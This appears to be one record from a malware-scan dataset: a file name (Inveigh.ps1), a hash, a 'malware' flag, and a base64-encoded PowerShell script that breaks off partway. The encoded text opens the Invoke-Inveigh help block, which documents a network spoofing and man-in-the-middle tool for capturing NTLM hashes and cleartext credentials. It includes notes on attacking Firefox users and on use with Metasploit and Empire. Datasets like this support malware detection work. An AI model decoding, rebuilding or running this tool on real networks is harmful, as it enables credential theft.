Inveigh.ps1,aa905a3508d9309a93ad5c0ec26ebc9b,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLUludmVpZ2gKewo8IwouU1lOT1BTSVMKSW52b2tlLUludmVpZ2ggaXMgYSBXaW5kb3dzIFBvd2VyU2hlbGwgTExNTlIvbUROUy9OQk5TIHNwb29mZXIvbWFuLWluLXRoZS1taWRkbGUgdG9vbCB3aXRoIGNoYWxsZW5nZS9yZXNwb25zZQpjYXB0dXJlIG92ZXIgSFRUUC9IVFRQUy9Qcm94eS9TTUIuCgouREVTQ1JJUFRJT04KSW52b2tlLUludmVpZ2ggaXMgYSBXaW5kb3dzIFBvd2VyU2hlbGwgTExNTlIvbUROUy9OQk5TIHNwb29mZXJtYW4taW4tdGhlLW1pZGRsZSB0b29sIHdpdGggdGhlIGZvbGxvd2luZyBmZWF0dXJlczoKCiAgICBJUHY0IExMTU5SL21ETlMvTkJOUyBzcG9vZmVyIHdpdGggZ3JhbnVsYXIgY29udHJvbAogICAgTlRMTXYxL05UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZSBvdmVyIEhUVFAvSFRUUFMvUHJveHkvU01CCiAgICBCYXNpYyBhdXRoIGNsZWFydGV4dCBjcmVkZW50aWFsIGNhcHR1cmUgb3ZlciBIVFRQL0hUVFBTL1Byb3h5CiAgICBXUEFEIHNlcnZlciBjYXBhYmxlIG9mIGhvc3RpbmcgYSBiYXNpYyBvciBjdXN0b20gd3BhZC5kYXQgZmlsZQogICAgSFRUUC9IVFRQUy9Qcm94eSBzZXJ2ZXIgY2FwYWJsZSBvZiBob3N0aW5nIGxpbWl0ZWQgY29udGVudAogICAgR3JhbnVsYXIgY29udHJvbCBvZiBjb25zb2xlIGFuZCBmaWxlIG91dHB1dAogICAgUnVuIHRpbWUgYW5kIHJ1biBjb3VudCBjb250cm9sCiAgICBMTE1OUi9OQk5TIHNwb29mZXIgbGVhcm5pbmcgbW9kZQoKLlBBUkFNRVRFUiBDaGFsbGVuZ2UKRGVmYXVsdCA9IFJhbmRvbTogMTYgY2hhcmFjdGVyIGhleCBOVExNIGNoYWxsZW5nZSBmb3IgdXNlIHdpdGggdGhlIEhUVFAgbGlzdGVuZXIuIElmIGxlZnQgYmxhbmssIGEgcmFuZG9tCmNoYWxsZW5nZSB3aWxsIGJlIGdlbmVyYXRlZCBmb3IgZWFjaCByZXF1ZXN0LgoKLlBBUkFNRVRFUiBDb25zb2xlT3V0cHV0CkRlZmF1bHQgPSBEaXNhYmxlZDogKExvdy9NZWRpdW0vWS9OKSBFbmFibGUvRGlzYWJsZSByZWFsIHRpbWUgY29uc29sZSBvdXRwdXQuIElmIHVzaW5nIHRoaXMgb3B0aW9uIHRocm91Z2ggYQpzaGVsbCwgdGVzdCB0byBlbnN1cmUgdGhhdCBpdCBkb2Vzbid0IGhhbmcgdGhlIHNoZWxsLiBNZWRpdW0gYW5kIExvdyBjYW4gYmUgdXNlZCB0byByZWR1Y2Ugb3V0cHV0LgoKLlBBUkFNRVRFUiBDb25zb2xlUXVldWVMaW1pdApEZWZhdWx0ID0gVW5saW1pdGVkOiBNYXhpbXVtIG51bWJlciBvZiBxdWV1ZWQgdXAgY29uc29sZSBsb2cgZW50cmllcyB3aGVuIG5vdCB1c2luZyB0aGUgcmVhbCB0aW1lIGNvbnNvbGUuIAoKLlBBUkFNRVRFUiBDb25zb2xlU3RhdHVzCihJbnRlZ2VyKSBJbnRlcnZhbCBpbiBtaW51dGVzIGZvciBkaXNwbGF5aW5nIGFsbCB1bmlxdWUgY2FwdHVyZWQgaGFzaGVzIGFuZCBjcmVkZW50aWFscy4gVGhpcyBpcyB1c2VmdWwgZm9yCmRpc3BsYXlpbmcgZnVsbCBjYXB0dXJlIGxpc3RzIHdoZW4gcnVubmluZyB0aHJvdWdoIGEgc2hlbGwgdGhhdCBkb2VzIG5vdCBoYXZlIGFjY2VzcyB0byB0aGUgc3VwcG9ydCBmdW5jdGlvbnMuCgouUEFSQU1FVEVSIENvbnNvbGVVbmlxdWUKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIGRpc3BsYXlpbmcgY2hhbGxlbmdlL3Jlc3BvbnNlIGhhc2hlcyBmb3Igb25seSB1bmlxdWUgSVAsIGRvbWFpbi9ob3N0bmFtZSwKYW5kIHVzZXJuYW1lIGNvbWJpbmF0aW9ucyB3aGVuIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dCBpcyBlbmFibGVkLgoKLlBBUkFNRVRFUiBFbGV2YXRlZFByaXZpbGVnZQpEZWZhdWx0ID0gQXV0bzogKEF1dG8vWS9OKSBTZXQgdGhlIHByaXZpbGVnZSBtb2RlLiBBdXRvIHdpbGwgZGV0ZXJtaW5lIGlmIEludmVpZ2ggaXMgcnVubmluZyB3aXRoCmVsZXZhdGVkIHByaXZpbGVnZS4gSWYgc28sIG9wdGlvbnMgdGhhdCByZXF1aXJlIGVsZXZhdGVkIHByaXZpbGVnZSBjYW4gYmUgdXNlZC4KCi5QQVJBTUVURVIgRmlsZU91dHB1dApEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHJlYWwgdGltZSBmaWxlIG91dHB1dC4KCi5QQVJBTUVURVIgRmlsZU91dHB1dERpcmVjdG9yeQpEZWZhdWx0ID0gV29ya2luZyBEaXJlY3Rvcnk6IFZhbGlkIHBhdGggdG8gYW4gb3V0cHV0IGRpcmVjdG9yeSBmb3IgbG9nIGFuZCBjYXB0dXJlIGZpbGVzLiBGaWxlT3V0cHV0IG11c3QKYWxzbyBiZSBlbmFibGVkLgoKLlBBUkFNRVRFUiBGaWxlVW5pcXVlCkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBvdXRwdXR0aW5nIGNoYWxsZW5nZS9yZXNwb25zZSBoYXNoZXMgZm9yIG9ubHkgdW5pcXVlIElQLCBkb21haW4vaG9zdG5hbWUsCmFuZCB1c2VybmFtZSBjb21iaW5hdGlvbnMgd2hlbiByZWFsIHRpbWUgZmlsZSBvdXRwdXQgaXMgZW5hYmxlZC4KCi5QQVJBTUVURVIgSFRUUApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgSFRUUCBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4KCi5QQVJBTUVURVIgSFRUUElQCkRlZmF1bHQgPSBBbnk6IElQIGFkZHJlc3MgZm9yIHRoZSBIVFRQL0hUVFBTIGxpc3RlbmVyLgoKLlBBUkFNRVRFUiBIVFRQUG9ydApEZWZhdWx0ID0gODA6IFRDUCBwb3J0IGZvciB0aGUgSFRUUCBsaXN0ZW5lci4KCi5QQVJBTUVURVIgSFRUUEF1dGgKRGVmYXVsdCA9IE5UTE06IChBbm9ueW1vdXMvQmFzaWMvTlRMTS9OVExNTm9FU1MpIEhUVFAvSFRUUFMgbGlzdGVuZXIgYXV0aGVudGljYXRpb24gdHlwZS4gVGhpcyBzZXR0aW5nIGRvZXMgbm90CmFwcGx5IHRvIHdwYWQuZGF0IHJlcXVlc3RzLiBOVExNTm9FU1MgdHVybnMgb2ZmIHRoZSAnRXh0ZW5kZWQgU2Vzc2lvbiBTZWN1cml0eScgZmxhZyBkdXJpbmcgbmVnb3RpYXRpb24uIAoKLlBBUkFNRVRFUiBIVFRQQmFzaWNSZWFsbQpSZWFsbSBuYW1lIGZvciBCYXNpYyBhdXRoZW50aWNhdGlvbi4gVGhpcyBwYXJhbWV0ZXIgYXBwbGllcyB0byBib3RoIEhUVFBBdXRoIGFuZCBXUEFEQXV0aC4KCi5QQVJBTUVURVIgSFRUUENvbnRlbnRUeXBlCkRlZmF1bHQgPSB0ZXh0L2h0bWw6IENvbnRlbnQgdHlwZSBmb3IgSFRUUC9IVFRQUy9Qcm94eSByZXNwb25zZXMuIERvZXMgbm90IGFwcGx5IHRvIEVYRXMgYW5kIHdwYWQuZGF0LiBTZXQgdG8KImFwcGxpY2F0aW9uL2h0YSIgZm9yIEhUQSBmaWxlcyBvciB3aGVuIHVzaW5nIEhUQSBjb2RlIHdpdGggSFRUUFJlc3BvbnNlLgoKLlBBUkFNRVRFUiBIVFRQRGlyCkZ1bGwgZGlyZWN0b3J5IHBhdGggdG8gZW5hYmxlIGhvc3Rpbmcgb2YgYmFzaWMgY29udGVudCB0aHJvdWdoIHRoZSBIVFRQL0hUVFBTIGxpc3RlbmVyLgoKLlBBUkFNRVRFUiBIVFRQRGVmYXVsdEZpbGUKRmlsZW5hbWUgd2l0aGluIHRoZSBIVFRQRGlyIHRvIHNlcnZlIGFzIHRoZSBkZWZhdWx0IEhUVFAvSFRUUFMvUHJveHkgcmVzcG9uc2UgZmlsZS4gVGhpcyBmaWxlIHdpbGwgbm90IGJlIHVzZWQgZm9yCndwYWQuZGF0IHJlcXVlc3RzLgoKLlBBUkFNRVRFUiBIVFRQRGVmYXVsdEVYRQpFWEUgZmlsZW5hbWUgd2l0aGluIHRoZSBIVFRQRGlyIHRvIHNlcnZlIGFzIHRoZSBkZWZhdWx0IEhUVFAvSFRUUFMvUHJveHkgcmVzcG9uc2UgZm9yIEVYRSByZXF1ZXN0cy4gCgouUEFSQU1FVEVSIEhUVFBSZXNldERlbGF5CkRlZmF1bHQgPSBGaXJlZm94OiBDb21tYSBzZXBhcmF0ZWQgbGlzdCBvZiBrZXl3b3JkcyB0byB1c2UgZm9yIGZpbHRlcmluZyBicm93c2VyIHVzZXIgYWdlbnRzLiBNYXRjaGluZyBicm93c2Vycwp3aWxsIGhhdmUgYSBkZWxheSBiZWZvcmUgdGhlaXIgY29ubmVjdGlvbnMgYXJlIHJlc2V0IHdoZW4gSW52ZWlnaCBkb2Vzbid0IHJlY2VpdmUgZGF0YS4gVGhpcyBjYW4gaW5jcmVhc2UgdGhlCmNoYW5jZSBvZiBjYXB0dXJpbmcgYXV0aGVudGljYXRpb24gdGhyb3VnaCBhIHBvcHVwIGJveCB3aXRoIHNvbWUgYnJvd3NlcnMgKEZpcmVmb3gpLgoKLlBBUkFNRVRFUiBIVFRQUmVzZXREZWxheVRpbWVvdXQKRGVmYXVsdCA9IDMwIFNlY29uZHM6IEhUVFBSZXNldERlbGF5IHRpbWVvdXQgaW4gc2Vjb25kcy4KCi5QQVJBTUVURVIgSFRUUFJlc3BvbnNlCkNvbnRlbnQgdG8gc2VydmUgYXMgdGhlIGRlZmF1bHQgSFRUUC9IVFRQUy9Qcm94eSByZXNwb25zZS4gVGhpcyByZXNwb25zZSB3aWxsIG5vdCBiZSB1c2VkIGZvciB3cGFkLmRhdCByZXF1ZXN0cy4KVGhpcyBwYXJhbWV0ZXIgd2lsbCBub3QgYmUgdXNlZCBpZiBIVFRQRGlyIGlzIHNldC4gVXNlIFBvd2VyU2hlbGwgY2hhcmFjdGVyIGVzY2FwZXMgYW5kIG5ld2xpbmVzIHdoZXJlIG5lY2Vzc2FyeS4KCi5QQVJBTUVURVIgSFRUUFMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBIVFRQUyBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4gV2FybmluZywgYSBjZXJ0IHdpbGwgYmUgaW5zdGFsbGVkIGluCnRoZSBsb2NhbCBzdG9yZS4gSWYgdGhlIHNjcmlwdCBkb2VzIG5vdCBleGl0IGdyYWNlZnVsbHksIG1hbnVhbGx5IHJlbW92ZSB0aGUgY2VydGlmaWNhdGUuIFRoaXMgZmVhdHVyZSByZXF1aXJlcwpsb2NhbCBhZG1pbmlzdHJhdG9yIGFjY2Vzcy4KCi5QQVJBTUVURVIgSFRUUFNQb3J0CkRlZmF1bHQgPSA0NDM6IFRDUCBwb3J0IGZvciB0aGUgSFRUUFMgbGlzdGVuZXIuCgouUEFSQU1FVEVSIEhUVFBTQ2VydElzc3VlcgpEZWZhdWx0ID0gSW52ZWlnaDogVGhlIGlzc3VlciBmaWVsZCBmb3IgdGhlIGNlcnQgdGhhdCB3aWxsIGJlIGluc3RhbGxlZCBmb3IgSFRUUFMuCgouUEFSQU1FVEVSIEhUVFBTQ2VydFN1YmplY3QKRGVmYXVsdCA9IGxvY2FsaG9zdDogVGhlIHN1YmplY3QgZmllbGQgZm9yIHRoZSBjZXJ0IHRoYXQgd2lsbCBiZSBpbnN0YWxsZWQgZm9yIEhUVFBTLgoKLlBBUkFNRVRFUiBIVFRQU0ZvcmNlQ2VydERlbGV0ZQpEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEZvcmNlIGRlbGV0aW9uIG9mIGFuIGV4aXN0aW5nIGNlcnRpZmljYXRlIHRoYXQgbWF0Y2hlcyBIVFRQU0NlcnRJc3N1ZXIgYW5kCkhUVFBTQ2VydFN1YmplY3QuCgouUEFSQU1FVEVSIEluc3BlY3QKKFN3aXRjaCkgSW5zcGVjdCBMTE1OUi9tRE5TL05CTlMgdHJhZmZpYyBvbmx5LiBXaXRoIGVsZXZhdGVkIHByaXZpbGVnZSwgU01CIG11c3QgYmUgZGlzYWJsZWQgd2l0aCAtc21iIGlmIHlvdSBkbwpub3Qgd2FudCBOVExNdjEvTlRMTXYyIGNhcHR1cmVzIG92ZXIgU01CLiBXaXRob3V0IGVsZXZhdGVkIHByaXZpbGVnZSwgdGhlIGRlc2lyZWQgaW5zcGVjdCBsaXN0ZW5lcnMgbXVzdCBiZQplbmFibGVkLgoKLlBBUkFNRVRFUiBJUApMb2NhbCBJUCBhZGRyZXNzIGZvciBsaXN0ZW5pbmcgYW5kIHBhY2tldCBzbmlmZmluZy4gVGhpcyBJUCBhZGRyZXNzIHdpbGwgYWxzbyBiZSB1c2VkIGZvciBMTE1OUi9tRE5TL05CTlMgc3Bvb2ZpbmcKaWYgdGhlIFNwb29mZXJJUCBwYXJhbWV0ZXIgaXMgbm90IHNldC4KCi5QQVJBTUVURVIgTG9nT3V0cHV0CkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBzdG9yaW5nIGxvZyBtZXNzYWdlcyBpbiBtZW1vcnkuCgouUEFSQU1FVEVSIExMTU5SCkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBMTE1OUiBzcG9vZmluZy4KCi5QQVJBTUVURVIgTExNTlJUVEwKRGVmYXVsdCA9IDMwIFNlY29uZHM6IExMTU5SIFRUTCBpbiBzZWNvbmRzIGZvciB0aGUgcmVzcG9uc2UgcGFja2V0LgoKLlBBUkFNRVRFUiBNYWNoaW5lQWNjb3VudHMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBzaG93aW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVzIGZyb20gbWFjaGluZSBhY2NvdW50cy4KCi5QQVJBTUVURVIgbUROUwpEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIG1ETlMgc3Bvb2ZpbmcuCgouUEFSQU1FVEVSIG1ETlNUVEwKRGVmYXVsdCA9IDEyMCBTZWNvbmRzOiBtRE5TIFRUTCBpbiBzZWNvbmRzIGZvciB0aGUgcmVzcG9uc2UgcGFja2V0LgoKLlBBUkFNRVRFUiBtRE5TVHlwZXMKRGVmYXVsdCA9IFFVOiBDb21tYSBzZXBhcmF0ZWQgbGlzdCBvZiBtRE5TIHR5cGVzIHRvIHNwb29mLiBOb3RlIHRoYXQgUU0gd2lsbCBzZW5kIHRoZSByZXNwb25zZSB0byAyMjQuMC4wLjI1MS4KVHlwZXMgaW5jbHVkZSBRVSA9IFF1ZXJ5IFVuaWNhc3QsIFFNID0gUXVlcnkgTXVsdGljYXN0CgouUEFSQU1FVEVSIE5CTlMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBOQk5TIHNwb29maW5nLgoKLlBBUkFNRVRFUiBOQk5TQnJ1dGVGb3JjZQpEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIE5CTlMgYnJ1dGUgZm9yY2Ugc3Bvb2Zlci4KCi5QQVJBTUVURVIgTkJOU0JydXRlRm9yY2VIb3N0CkRlZmF1bHQgPSBXUEFEOiBIb3N0bmFtZSBmb3IgdGhlIE5CTlMgQnJ1dGUgRm9yY2Ugc3Bvb2Zlci4KCi5QQVJBTUVURVIgTkJOU0JydXRlRm9yY2VQYXVzZQpEZWZhdWx0ID0gRGlzYWJsZWQ6IChJbnRlZ2VyKSBOdW1iZXIgb2Ygc2Vjb25kcyB0aGUgTkJOUyBicnV0ZSBmb3JjZSBzcG9vZmVyIHdpbGwgc3RvcCBzcG9vZmluZyBhZnRlciBhbiBpbmNvbWluZwpIVFRQIHJlcXVlc3QgaXMgcmVjZWl2ZWQuCgouUEFSQU1FVEVSIE5CTlNCcnV0ZUZvcmNlVGFyZ2V0CklQIGFkZHJlc3MgdG8gdGFyZ2V0IGZvciBOQk5TIGJydXRlIGZvcmNlIHNwb29maW5nLiAKCi5QQVJBTUVURVIgTkJOU1RUTApEZWZhdWx0ID0gMTY1IFNlY29uZHM6IE5CTlMgVFRMIGluIHNlY29uZHMgZm9yIHRoZSByZXNwb25zZSBwYWNrZXQuCgouUEFSQU1FVEVSIE5CTlNUeXBlcwpEZWZhdWx0ID0gMDAsMjA6IENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIE5CTlMgdHlwZXMgdG8gc3Bvb2YuClR5cGVzIGluY2x1ZGUgMDAgPSBXb3Jrc3RhdGlvbiBTZXJ2aWNlLCAwMyA9IE1lc3NlbmdlciBTZXJ2aWNlLCAyMCA9IFNlcnZlciBTZXJ2aWNlLCAxQiA9IERvbWFpbiBOYW1lCgouUEFSQU1FVEVSIE91dHB1dFN0cmVhbU9ubHkKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBmb3JjaW5nIGFsbCBvdXRwdXQgdG8gdGhlIHN0YW5kYXJkIG91dHB1dCBzdHJlYW0uIFRoaXMgY2FuIGJlIGhlbHBmdWwgaWYKcnVubmluZyBJbnZlaWdoIHRocm91Z2ggYSBzaGVsbCB0aGF0IGRvZXMgbm90IHJldHVybiBvdGhlciBvdXRwdXQgc3RyZWFtcy5Ob3RlIHRoYXQgeW91IHdpbGwgbm90IHNlZSB0aGUgdmFyaW91cwp5ZWxsb3cgd2FybmluZyBtZXNzYWdlcyBpZiBlbmFibGVkLgoKLlBBUkFNRVRFUiBQcm94eQpEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHByb3h5IGxpc3RlbmVyIGF1dGhlbnRpY2F0aW9uIGNhcHR1cmVzLgoKLlBBUkFNRVRFUiBQcm94eUF1dGgKRGVmYXVsdCA9IE5UTE06IChCYXNpYy9OVExNL05UTE1Ob0VTUykgUHJveHkgbGlzdGVuZXIgYXV0aGVudGljYXRpb24gdHlwZS4KCi5QQVJBTUVURVIgUHJveHlJUApEZWZhdWx0ID0gQW55OiBJUCBhZGRyZXNzIGZvciB0aGUgcHJveHkgbGlzdGVuZXIuCgouUEFSQU1FVEVSIFByb3h5UG9ydApEZWZhdWx0ID0gODQ5MjogVENQIHBvcnQgZm9yIHRoZSBwcm94eSBsaXN0ZW5lci4KCi5QQVJBTUVURVIgUHJveHlJZ25vcmUKRGVmYXVsdCA9IEZpcmVmb3g6IENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIGtleXdvcmRzIHRvIHVzZSBmb3IgZmlsdGVyaW5nIGJyb3dzZXIgdXNlciBhZ2VudHMuIE1hdGNoaW5nIGJyb3dzZXJzCndpbGwgbm90IGJlIHNlbnQgdGhlIHdwYWQuZGF0IGZpbGUgdXNlZCBmb3IgY2FwdHVyaW5nIHByb3h5IGF1dGhlbnRpY2F0aW9ucy4gRmlyZWZveCBkb2VzIG5vdCB3b3JrIGNvcnJlY3RseQp3aXRoIHRoZSBwcm94eSBzZXJ2ZXIgZmFpbG92ZXIgc2V0dXAuIEZpcmVmb3ggd2lsbCBiZSBsZWZ0IHVuYWJsZSB0byBjb25uZWN0IHRvIGFueSBzaXRlcyB1bnRpbCB0aGUgcHJveHkgaXMKY2xlYXJlZC4gUmVtb3ZlICJGaXJlZm94IiBmcm9tIHRoaXMgbGlzdCB0byBhdHRhY2sgRmlyZWZveC4gSWYgYXR0YWNraW5nIEZpcmVmb3gsIGNvbnNpZGVyIHNldHRpbmcKLVNwb29mZXJSZXBlYXQgTiB0byBsaW1pdCBhdHRhY2tzIGFnYWluc3QgYSBzaW5nbGUgdGFyZ2V0IHNvIHRoYXQgdmljdGltcyBjYW4gcmVjb3ZlciBGaXJlZm94IGNvbm5lY3Rpdml0eSBieQpjbG9zaW5nIGFuZCByZW9wZW5pbmcuCgouUEFSQU1FVEVSIFNob3dIZWxwCkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSB0aGUgaGVscCBtZXNzYWdlcyBhdCBzdGFydHVwLgoKLlBBUkFNRVRFUiBTTUIKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIFNNQiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4gV2FybmluZywgTExNTlIvTkJOUyBzcG9vZmluZyBjYW4gc3RpbGwKZGlyZWN0IHRhcmdldHMgdG8gdGhlIGhvc3Qgc3lzdGVtJ3MgU01CIHNlcnZlci4gQmxvY2sgVENQIHBvcnRzIDQ0NS8xMzkgb3Iga2lsbCB0aGUgU01CIHNlcnZpY2VzIGlmIHlvdSBuZWVkIHRvCnByZXZlbnQgbG9naW4gcmVxdWVzdHMgZnJvbSBiZWluZyBwcm9jZXNzZWQgYnkgdGhlIEludmVpZ2ggaG9zdC4gIAoKLlBBUkFNRVRFUiBTcG9vZmVySG9zdHNJZ25vcmUKRGVmYXVsdCA9IEFsbDogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2YgcmVxdWVzdGVkIGhvc3RuYW1lcyB0byBpZ25vcmUgd2hlbiBzcG9vZmluZyB3aXRoIExMTU5SL21ETlMvTkJOUy4KCi5QQVJBTUVURVIgU3Bvb2Zlckhvc3RzUmVwbHkKRGVmYXVsdCA9IEFsbDogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2YgcmVxdWVzdGVkIGhvc3RuYW1lcyB0byByZXNwb25kIHRvIHdoZW4gc3Bvb2Zpbmcgd2l0aCBMTE1OUi9tRE5TL05CTlMuCgouUEFSQU1FVEVSIFNwb29mZXJJUApJUCBhZGRyZXNzIGZvciBMTE1OUi9tRE5TL05CTlMgc3Bvb2ZpbmcuIFRoaXMgcGFyYW1ldGVyIGlzIG9ubHkgbmVjZXNzYXJ5IHdoZW4gcmVkaXJlY3RpbmcgdmljdGltcyB0byBhIHN5c3RlbQpvdGhlciB0aGFuIHRoZSBJbnZlaWdoIGhvc3QuCgouUEFSQU1FVEVSIFNwb29mZXJJUHNJZ25vcmUKRGVmYXVsdCA9IEFsbDogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2Ygc291cmNlIElQIGFkZHJlc3NlcyB0byBpZ25vcmUgd2hlbiBzcG9vZmluZyB3aXRoIExMTU5SL21ETlMvTkJOUy4KCi5QQVJBTUVURVIgU3Bvb2ZlcklQc1JlcGx5CkRlZmF1bHQgPSBBbGw6IENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIHNvdXJjZSBJUCBhZGRyZXNzZXMgdG8gcmVzcG9uZCB0byB3aGVuIHNwb29maW5nIHdpdGggTExNTlIvbUROUy9OQk5TLgoKLlBBUkFNRVRFUiBTcG9vZmVyTGVhcm5pbmcKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBMTE1OUi9OQk5TIHZhbGlkIGhvc3QgbGVhcm5pbmcuIElmIGVuYWJsZWQsIEludmVpZ2ggd2lsbCBzZW5kIG91dApMTE1OUi9OQk5TIHJlcXVlc3RzIGZvciBhbnkgcmVjZWl2ZWQgTExNTlIvTkJOUyByZXF1ZXN0cy4gSWYgYSByZXNwb25zZSBpcyByZWNlaXZlZCwgSW52ZWlnaCB3aWxsIGFkZCB0aGUKaG9zdG5hbWUgdG8gYSBzcG9vZmluZyBibGFja2xpc3QuCgouUEFSQU1FVEVSIFNwb29mZXJMZWFybmluZ0RlbGF5CihJbnRlZ2VyKSBUaW1lIGluIG1pbnV0ZXMgdGhhdCBJbnZlaWdoIHdpbGwgZGVsYXkgc3Bvb2Zpbmcgd2hpbGUgdmFsaWQgaG9zdHMgYXJlIGJlaW5nIGJsYWNrbGlzdGVkIHRocm91Z2gKU3Bvb2ZlckxlYXJuaW5nLgoKLlBBUkFNRVRFUiBTcG9vZmVyTGVhcm5pbmdJbnRlcnZhbApEZWZhdWx0ID0gMzAgTWludXRlczogKEludGVnZXIpIFRpbWUgaW4gbWludXRlcyB0aGF0IEludmVpZ2ggd2FpdCBiZWZvcmUgc2VuZGluZyBvdXQgYW4gTExNTlIvTkJOUyByZXF1ZXN0IGZvciBhCmhvc3RuYW1lIHRoYXQgaGFzIGFscmVhZHkgYmVlbiBjaGVja2VkIGlmIFNwb29mZXJMZWFybmluZyBpcyBlbmFibGVkLiAgIAoKLlBBUkFNRVRFUiBTcG9vZmVyUmVwZWF0CkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSByZXBlYXRlZCBMTE1OUi9OQk5TIHNwb29mcyB0byBhIHZpY3RpbSBzeXN0ZW0gYWZ0ZXIgb25lIHVzZXIKY2hhbGxlbmdlL3Jlc3BvbnNlIGhhcyBiZWVuIGNhcHR1cmVkLgoKLlBBUkFNRVRFUiBTdGFydHVwQ2hlY2tzCkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBjaGVja3MgZm9yIGluIHVzZSBwb3J0cyBhbmQgcnVubmluZyBzZXJ2aWNlcyBvbiBzdGFydHVwLgoKLlBBUkFNRVRFUiBTdGF0dXNPdXRwdXQKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHN0YXJ0dXAgYW5kIHNodXRkb3duIG1lc3NhZ2VzLgoKLlBBUkFNRVRFUiBSdW5Db3VudApEZWZhdWx0ID0gVW5saW1pdGVkOiAoSW50ZWdlcikgTnVtYmVyIG9mIE5UTE12MS9OVExNdjIvY2xlYXJ0ZXh0IGNhcHR1cmVzIHRvIHBlcmZvcm0gYmVmb3JlIGF1dG8tZXhpdGluZy4KCi5QQVJBTUVURVIgUnVuVGltZQooSW50ZWdlcikgUnVuIHRpbWUgZHVyYXRpb24gaW4gbWludXRlcy4KCi5QQVJBTUVURVIgVG9vbApEZWZhdWx0ID0gMDogKDAvMS8yKSBFbmFibGUvRGlzYWJsZSBmZWF0dXJlcyBmb3IgYmV0dGVyIG9wZXJhdGlvbiB0aHJvdWdoIGV4dGVybmFsIHRvb2xzIHN1Y2ggYXMgTWV0ZXJwcmV0ZXIncwpQb3dlclNoZWxsIGV4dGVuc2lvbiwgTWV0YXNwbG9pdCdzIEludGVyYWN0aXZlIFBvd2VyU2hlbGwgU2Vzc2lvbnMgcGF5bG9hZHMgYW5kIEVtcGlyZS4KMCA9IE5vbmUsIDEgPSBNZXRhc3Bsb2l0L01ldGVycHJldGVyLCAyID0gRW1waXJlICAgCgouUEFSQU1FVEVSIFdQQURBdXRoCkRlZmF1bHQgPSBOVExNOiAoQW5vbnltb3VzL0Jhc2ljL05UTE0vTlRMTU5vRVNTKSBIVFRQL0hUVFBTIGxpc3RlbmVyIGF1dGhlbnRpY2F0aW9uIHR5cGUgZm9yIHdwYWQuZGF0IHJlcXVlc3RzLgpTZXR0aW5nIHRvIEFub255bW91cyBjYW4gcHJldmVudCBicm93c2VyIGxvZ2luIHByb21wdHMuIE5UTE1Ob0VTUyB0dXJucyBvZmYgdGhlICdFeHRlbmRlZCBTZXNzaW9uIFNlY3VyaXR5JyBmbGFnCmR1cmluZyBuZWdvdGlhdGlvbi4KCi5QQVJBTUVURVIgV1BBREF1dGhJZ25vcmUKRGVmYXVsdCA9IEZpcmVmb3g6IENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIGtleXdvcmRzIHRvIHVzZSBmb3IgZmlsdGVyaW5nIGJyb3dzZXIgdXNlciBhZ2VudHMuIE1hdGNoaW5nIGJyb3dzZXJzCndpbGwgYmUgc2tpcHBlZCBmb3IgTlRMTSBhdXRoZW50aWNhdGlvbi4gVGhpcyBjYW4gYmUgdXNlZCB0byBmaWx0ZXIgb3V0IGJyb3dzZXJzIGxpa2UgRmlyZWZveCB0aGF0IGRpc3BsYXkgbG9naW4KcG9wdXBzIGZvciBhdXRoZW50aWNhdGVkIHdwYWQuZGF0IHJlcXVlc3RzIHN1Y2ggYXMgRmlyZWZveC4gICAKCi5QQVJBTUVURVIgV1BBRERpcmVjdEZpbGUKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHNlcnZpbmcgYSBwcm94eWxlc3MsIGFsbCBkaXJlY3QsIHdwYWQuZGF0IGZpbGUgZm9yIHdwYWQuZGF0IHJlcXVlc3RzLgpFbmFibGluZyB0aGlzIHNldHRpbmcgY2FuIHJlZHVjZSB0aGUgYW1vdW50IG9mIHJlZHVuZGFudCB3cGFkLmRhdCByZXF1ZXN0cy4gVGhpcyBwYXJhbWV0ZXIgaXMgaWdub3JlZCB